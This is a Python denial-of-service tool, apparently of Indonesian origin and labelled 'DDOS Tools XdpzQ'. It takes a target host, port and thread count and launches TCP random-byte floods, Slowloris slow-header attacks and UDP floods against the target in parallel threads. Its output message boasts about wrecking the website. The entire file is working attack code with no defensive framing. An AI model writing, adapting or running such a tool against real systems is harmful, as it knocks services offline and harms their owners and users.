import os
import sys
import time
import random
import socket
import threading
import argparse

# Konfigurasi dasar
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
]

def get_args():
    parser = argparse.ArgumentParser(description="DDOS Tools XdpzQ")
    parser.add_argument("host", help="Target host/website")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("threads", type=int, help="Number of threads")
    return parser.parse_args()

def dos(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Kirim request sampah terus menerus
        while True:
            rand = random._urandom(1024)
            sock.send(rand)
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

def slowloris(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))

        # Kirim header lambat
        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('utf-8'))
        sock.send("Host: {}\r\n".format(host).encode('utf-8'))
        sock.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode('utf-8'))
        sock.send("Connection: keep-alive\r\n".encode('utf-8'))

        while True:
            sock.send("X-a: {}\r\n".format(random.randint(1, 9999)).encode('utf-8'))
            time.sleep(15)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

def udp_flood(host):
    try:
        port = random.randint(1, 65535)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while True:
            data = random._urandom(1024)
            sock.sendto(data, (host, port))

    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

def main():
    args = get_args()
    host = args.host
    port = args.port
    threads = args.threads

    print(f"Target: {host}:{port}")
    print(f"Jumlah Threads: {threads}")
    print("Mulai serangan... siap-siap liat website ancur!")

    for _ in range(threads):
        threading.Thread(target=dos, args=(host, port)).start()
        threading.Thread(target=slowloris, args=(host, port)).start()
        threading.Thread(target=udp_flood, args=(host,)).start()

if __name__ == "__main__":
    main()
